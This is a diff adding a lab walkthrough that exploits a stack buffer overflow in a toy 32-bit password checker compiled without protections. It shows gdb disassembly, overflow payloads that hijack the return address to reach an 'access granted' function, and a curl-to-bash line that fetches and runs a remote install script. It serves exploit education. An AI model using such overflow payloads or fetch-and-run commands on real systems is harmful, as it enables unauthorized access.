@@ -1,0 +1,220 @@
+compiling like this: $ gcc -m32 -z execstack -fno-stack-protector buffer_overflow.c -o buffer_overflow
+	- disabling some protections and compiling it for 32bit system to keep it simple.
+	- install gcc-multilib if needed to compile
+
+configure gef for gdb
+	- $ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+
+run: $ gdb buffer_overflow
+
+Lets disassemble some functions... main and check pw
+
+gef➤  disas main
+Dump of assembler code for function main:
+   0x0000128c <+0>:	lea    ecx,[esp+0x4]
+   0x00001290 <+4>:	and    esp,0xfffffff0
+   0x00001293 <+7>:	push   DWORD PTR [ecx-0x4]
+   0x00001296 <+10>:	push   ebp
+   0x00001297 <+11>:	mov    ebp,esp
+   0x00001299 <+13>:	push   esi
+   0x0000129a <+14>:	push   ebx
+   0x0000129b <+15>:	push   ecx
+   0x0000129c <+16>:	sub    esp,0xc
+   0x0000129f <+19>:	call   0x10f0 <__x86.get_pc_thunk.bx>
+   0x000012a4 <+24>:	add    ebx,0x2d20
+   0x000012aa <+30>:	mov    esi,ecx
+   0x000012ac <+32>:	sub    esp,0xc
+   0x000012af <+35>:	push   0x3e8
+   0x000012b4 <+40>:	call   0x10a0 <setuid@plt> // setting ID to 1000 - 0x3e8 is probably a 1000 in hex
+   0x000012b9 <+45>:	add    esp,0x10
+   0x000012bc <+48>:	cmp    DWORD PTR [esi],0x1
+   0x000012bf <+51>:	jle    0x12dd <main+81>
+   0x000012c1 <+53>:	sub    esp,0xc
+   0x000012c4 <+56>:	lea    eax,[ebx-0x1f77]
+   0x000012ca <+62>:	push   eax
+   0x000012cb <+63>:	call   0x1080 <puts@plt> // prints to the screen
+   0x000012d0 <+68>:	add    esp,0x10
+   0x000012d3 <+71>:	sub    esp,0xc
+   0x000012d6 <+74>:	push   0x1
+   0x000012d8 <+76>:	call   0x1090 <exit@plt>
+   0x000012dd <+81>:	call   0x11ed <checkpw> // our function that uses gets
+   0x000012e2 <+86>:	mov    eax,0x0
+   0x000012e7 <+91>:	lea    esp,[ebp-0xc]
+   0x000012ea <+94>:	pop    ecx
+   0x000012eb <+95>:	pop    ebx
+   0x000012ec <+96>:	pop    esi
+   0x000012ed <+97>:	pop    ebp
+   0x000012ee <+98>:	lea    esp,[ecx-0x4]
+   0x000012f1 <+101>:	ret    
+End of assembler dump.
+
+
+gef➤  disas checkpw
+Dump of assembler code for function checkpw:
+   0x000011ed <+0>:	push   ebp
+   0x000011ee <+1>:	mov    ebp,esp
+   0x000011f0 <+3>:	push   ebx
+   0x000011f1 <+4>:	sub    esp,0x74
+   0x000011f4 <+7>:	call   0x10f0 <__x86.get_pc_thunk.bx>
+   0x000011f9 <+12>:	add    ebx,0x2dcb
+   0x000011ff <+18>:	sub    esp,0xc
+   0x00001202 <+21>:	lea    eax,[ebx-0x1fbc]
+   0x00001208 <+27>:	push   eax
+   0x00001209 <+28>:	call   0x1060 <printf@plt>
+   0x0000120e <+33>:	add    esp,0x10
+   0x00001211 <+36>:	sub    esp,0xc
+   0x00001214 <+39>:	lea    eax,[ebp-0x6c] // extended base pointer
+   0x00001217 <+42>:	push   eax
+   0x00001218 <+43>:	call   0x1070 <gets@plt> // this is what we need. Needs a dest address which has the buffer size. 0x6c should be it - we get 108 (100 + 8) we need 108 bytes to overflow that buffer
+   0x0000121d <+48>:	add    esp,0x10
+   0x00001220 <+51>:	sub    esp,0x8
+   0x00001223 <+54>:	lea    eax,[ebp-0x6c]
+   0x00001226 <+57>:	push   eax
+   0x00001227 <+58>:	lea    eax,[ebx-0x1fa4]
+   0x0000122d <+64>:	push   eax
+   0x0000122e <+65>:	call   0x1040 <strcmp@plt>
+   0x00001233 <+70>:	add    esp,0x10
+   0x00001236 <+73>:	test   eax,eax
+   0x00001238 <+75>:	jne    0x1241 <checkpw+84>
+   0x0000123a <+77>:	call   0x125d <granted>
+   0x0000123f <+82>:	jmp    0x1253 <checkpw+102>
+   0x00001241 <+84>:	sub    esp,0xc
+   0x00001244 <+87>:	lea    eax,[ebx-0x1f98]
+   0x0000124a <+93>:	push   eax
+   0x0000124b <+94>:	call   0x1080 <puts@plt>
+   0x00001250 <+99>:	add    esp,0x10
+   0x00001253 <+102>:	mov    eax,0x0
+   0x00001258 <+107>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x0000125b <+110>:	leave  
+   0x0000125c <+111>:	ret    
+End of assembler dump.
+
+Lets try to chenge return pointer
+
+gef➤  run < <(python3 -c 'print("A" * 100 + "BBBB" + "CCCC" + "DDDD")')
+Starting program: /home/ubuntu/buffer_overflow < <(python3 -c 'print("A" * 100 + "BBBB" + "CCCC" + "DDDD")')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Please enter password: Wrong password
+
+Program received signal SIGSEGV, Segmentation fault.
+0x56556200 in checkpw ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x0       
+$ebx   : 0x43434343 ("CCCC"?)
+$ecx   : 0xf7e2b9b4  →  0x00000000
+$edx   : 0x1       
+$esp   : 0xffffd0e0  →  0xffffd120  →  0xf7e2a000  →  0x00229dac
+$ebp   : 0x44444444 ("DDDD"?)
+$esi   : 0xffffd110  →  0x00000001
+$edi   : 0xf7ffcb80  →  0x00000000
+$eip   : 0x56556200  →  <checkpw+19> in al, dx
+$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+
+
+lets send 4 more bytes
+
+gef➤  run < <(python3 -c 'print("A" * 100 + "BBBB" + "CCCC" + "DDDD" + "EEEE")')
+Starting program: /home/ubuntu/buffer_overflow < <(python3 -c 'print("A" * 100 + "BBBB" + "CCCC" + "DDDD" + "EEEE")')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Please enter password: Wrong password
+
+Program received signal SIGSEGV, Segmentation fault.
+0x45454545 in ?? ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x0       
+$ebx   : 0x43434343 ("CCCC"?)
+$ecx   : 0xf7e2b9b4  →  0x00000000
+$edx   : 0x1       
+$esp   : 0xffffd0e0  →  0xffffd100  →  0xffffd387  →  "/home/ubuntu/buffer_overflow"
+$ebp   : 0x44444444 ("DDDD"?)
+$esi   : 0xffffd110  →  0x00000001
+$edi   : 0xf7ffcb80  →  0x00000000
+$eip   : 0x45454545 ("EEEE"?) // WE CHANGED RETURN POINTER
+$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd0e0│+0x0000: 0xffffd100  →  0xffffd387  →  "/home/ubuntu/buffer_overflow"	 ← $esp
+0xffffd0e4│+0x0004: 0xf7fbe66c  →  0xf7ffdba0  →  0xf7fbe780  →  0xf7ffda40  →  0x56555000  →   jg 0x56555047
+0xffffd0e8│+0x0008: 0xf7fbeb20  →  0xf7c1acc6  →  "GLIBC_PRIVATE"
+0xffffd0ec│+0x000c: 0xffffd110  →  0x00000001
+0xffffd0f0│+0x0010: 0xf7e2a000  →  0x00229dac
+0xffffd0f4│+0x0014: 0xffffd1c4  →  0xffffd387  →  "/home/ubuntu/buffer_overflow"
+0xffffd0f8│+0x0018: 0xf7ffd020  →  0xf7ffda40  →  0x56555000  →   jg 0x56555047
+0xffffd0fc│+0x001c: 0xf7c21519  →   add esp, 0x10
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x45454545 // == EEEE
+
+=== Now we are in control of that process!!! ===
+
+Lets get access - return the granted function...
+
+gef➤  disas checkpw
+Dump of assembler code for function checkpw:
+   0x565561ed <+0>:	push   ebp
+   0x565561ee <+1>:	mov    ebp,esp
+   0x565561f0 <+3>:	push   ebx
+   0x565561f1 <+4>:	sub    esp,0x74
+   0x565561f4 <+7>:	call   0x565560f0 <__x86.get_pc_thunk.bx>
+   0x565561f9 <+12>:	add    ebx,0x2dcb
+   0x565561ff <+18>:	sub    esp,0xc
+   0x56556202 <+21>:	lea    eax,[ebx-0x1fbc]
+   0x56556208 <+27>:	push   eax
+   0x56556209 <+28>:	call   0x56556060 <printf@plt>
+   0x5655620e <+33>:	add    esp,0x10
+   0x56556211 <+36>:	sub    esp,0xc
+   0x56556214 <+39>:	lea    eax,[ebp-0x6c]
+   0x56556217 <+42>:	push   eax
+   0x56556218 <+43>:	call   0x56556070 <gets@plt>
+   0x5655621d <+48>:	add    esp,0x10
+   0x56556220 <+51>:	sub    esp,0x8
+   0x56556223 <+54>:	lea    eax,[ebp-0x6c]
+   0x56556226 <+57>:	push   eax
+   0x56556227 <+58>:	lea    eax,[ebx-0x1fa4]
+   0x5655622d <+64>:	push   eax
+   0x5655622e <+65>:	call   0x56556040 <strcmp@plt>
+   0x56556233 <+70>:	add    esp,0x10
+   0x56556236 <+73>:	test   eax,eax
+   0x56556238 <+75>:	jne    0x56556241 <checkpw+84>
+   0x5655623a <+77>:	call   0x5655625d <granted> // WE NEED THIS!!! 0x5655623a
+   0x5655623f <+82>:	jmp    0x56556253 <checkpw+102>
+   0x56556241 <+84>:	sub    esp,0xc
+   0x56556244 <+87>:	lea    eax,[ebx-0x1f98]
+   0x5655624a <+93>:	push   eax
+   0x5655624b <+94>:	call   0x56556080 <puts@plt>
+   0x56556250 <+99>:	add    esp,0x10
+   0x56556253 <+102>:	mov    eax,0x0
+   0x56556258 <+107>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x5655625b <+110>:	leave  
+   0x5655625c <+111>:	ret    
+End of assembler dump.
+ 
+now lets run the same thing with 0x5655623a insted of EEEE
+run < <(python3 -c 'print("A" * 100 + "BBBB" + "CCCC" + "DDDD" + "\x3a\x62\x55\x56")') // reverse because x86 is little endian architecture
+
+gef➤  run < <(python3 -c 'print("A" * 100 + "BBBB" + "CCCC" + "DDDD" + "\x3a\x62\x55\x56")')
+Starting program: /home/ubuntu/buffer_overflow < <(python3 -c 'print("A" * 100 + "BBBB" + "CCCC" + "DDDD" + "\x3a\x62\x55\x56")')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Please enter password: Wrong password
+Access GRANTED!!!
+.
+.
+.
+.
+
+We got access :) 
+
+ 
+
+
+
+
+
+
